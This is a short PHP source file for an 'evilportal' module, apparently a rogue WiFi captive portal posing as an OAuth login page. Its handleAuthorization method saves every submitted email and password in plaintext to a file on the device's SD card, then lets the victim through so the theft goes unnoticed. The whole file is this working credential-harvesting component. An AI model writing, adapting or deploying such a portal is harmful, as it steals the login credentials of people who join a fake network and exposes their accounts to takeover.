<?php namespace evilportal;

class MyPortal extends Portal
{

    public function handleAuthorization()
    {

      if (!is_dir('/sd/oauth-login/')) {
        // dir doesn't exist, make it
        mkdir('/sd/oauth-login/');
      }

      if (isset($_POST['email'])) {
        file_put_contents("/sd/oauth-login/data.txt", $_POST['email'] . ' : ' . $_POST['pass'] . "\n", FILE_APPEND);
      }

        // Call parent to handle basic authorization first
        parent::handleAuthorization();

        // Check for other form data here
    }

    public function showSuccess()
    {
        // Calls default success message
        parent::showSuccess();
    }

    public function showError()
    {
        // Calls default error message
        parent::showError();
    }
}
